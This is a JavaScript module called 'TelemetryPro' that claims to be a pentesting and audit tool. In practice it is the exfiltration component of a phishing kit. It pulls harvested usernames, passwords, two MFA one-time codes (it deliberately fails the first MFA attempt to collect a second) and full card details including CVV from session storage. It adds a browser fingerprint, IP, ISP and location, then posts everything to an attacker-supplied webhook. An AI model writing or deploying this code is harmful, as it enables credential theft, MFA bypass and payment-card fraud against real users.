/**
 * TelemetryPro v1.0.0 - Unified Audit Module
 * Professional-grade metadata logging for security pentesting and CIAM auditing.
 * * Features:
 * - Canvas Fingerprinting (Hardware-based ID)
 * - VPN/Proxy/Hosting Detection via ip-api
 * - Asynchronous Data Exfiltration (via Webhook)
 * - Multi-stage Session Capture
 */

const TelemetryScanner = {
    /**
     * GLOBAL SETTINGS
     * enableGhosting: If true, the first MFA attempt will fail on purpose. 
     * used to harvest 2 otp codes incase 1st is invalid/expires
     */
    settings: {
        enableGhosting: false
    },

    /**
     * Generates a unique ID based on the browser's rendering engine.
     * This ID is persistent across VPNs and IP changes.
     */
    getFingerprint: () => {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = "top";
        ctx.font = "14px 'Arial'";
        ctx.fillStyle = "#f60";
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = "#069";
        ctx.fillText("Audit_ID_v1", 2, 15);
        // Extracts the unique hash of the hardware's rendering behavior
        return btoa(canvas.toDataURL()).slice(-40, -10);
    },

    /**
     * Network Identification using ip-api.com.
     * Flags 'proxy' or 'hosting' to identify VPNs or Tor exit nodes.
     */
    getNetworkData: async () => {
        try {
            const res = await fetch('http://ip-api.com/json/?fields=status,message,country,city,isp,proxy,hosting,query');
            const d = await res.json();
            return {
                ip: d.query || "Masked",
                isp: d.isp || "Unknown",
                isProxy: d.proxy || d.hosting || false,
                location: d.status === "success" ? `${d.city}, ${d.country}` : "Unknown"
            };
        } catch (e) {
            console.error("Network telemetry blocked by client.");
            return { ip: "Fetch Failed", isProxy: false, location: "Unknown" };
        }
    },

    /**
     * Captures system-level metadata for device profiling.
     */
    getSystemData: () => ({
        ua: navigator.userAgent,
        plat: navigator.platform,
        mem: navigator.deviceMemory || 'N/A', // RAM in GB
        res: `${window.screen.width}x${window.screen.height}`,
        cores: navigator.hardwareConcurrency || 'N/A'
    }),

    /**
     * Sends the aggregated report to the designated Webhook.
     * Maps risk levels based on VPN detection.
     */
    sendToWebhook: async (data, isFinal = false) => {
        // --- REPLACE THE URL BELOW WITH YOUR ACTUAL WEBHOOK ---
        const WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE';
        
        const riskLevel = data.net.isProxy ? "🔴 HIGH RISK (VPN/Proxy Detected)" : "🟢 Low Risk (Residential)";

        const payload = {
            username: "Audit-Log-Bot",
            embeds: [{
                title: isFinal ? "🏁 Audit Complete - Full Capture" : "⚠️ Partial Capture (Credential Harvest)",
                color: data.net.isProxy ? 15158332 : 3066993, // Red if Proxy, Green if not
                fields: [
                    { name: "Fingerprint ID", value: `\`${data.fp}\``, inline: true },
                    { name: "Risk Assessment", value: riskLevel, inline: true },
                    { name: "Network Info", value: `**IP:** ${data.net.ip}\n**ISP:** ${data.net.isp}` },
                    { name: "Geo-Location", value: data.net.location, inline: true },
                    { name: "Device Profiling", value: `${data.sys.plat} | ${data.sys.cores} Cores | ${data.sys.mem}GB RAM`, inline: true },
                    { 
                        name: "Captured Credentials", 
                        value: `**User:** \`${sessionStorage.getItem('log_u') || 'none'}\` \n**Pass:** \`${sessionStorage.getItem('log_p') || 'none'}\`` 
                    },
                    { 
                        name: "MFA (OTP) Stream", 
                        value: `**Attempt 1:** \`${sessionStorage.getItem('mfa_1') || '-'}\` \n**Attempt 2:** \`${sessionStorage.getItem('mfa_2') || '-'}\`` 
                    },
                    { 
                        name: "💳 Billing Data", 
                        value: `**Name:** \`${sessionStorage.getItem('cc_name') || '-'}\`\n**Card:** \`${sessionStorage.getItem('cc_num') || '-'}\`\n**Exp:** \`${sessionStorage.getItem('cc_exp') || '-'}\` | **CVV:** \`${sessionStorage.getItem('cc_cvv') || '-'}\``
                    }
                ],
                footer: { text: `TelemetryPro Audit • ${new Date().toLocaleString()}` }
            }]
        };

        try {
            await fetch(WEBHOOK_URL, { 
                method: 'POST', 
                headers: {'Content-Type': 'application/json'}, 
                body: JSON.stringify(payload) 
            });
        } catch (err) {
            console.error("Exfiltration failed. Check Webhook connectivity.");
        }
    },

    /**
     * Master execution wrapper.
     */
    runAudit: async (isFinal = false) => {
        const report = {
            fp: TelemetryScanner.getFingerprint(),
            net: await TelemetryScanner.getNetworkData(),
            sys: TelemetryScanner.getSystemData()
        };
        await TelemetryScanner.sendToWebhook(report, isFinal);
    }
};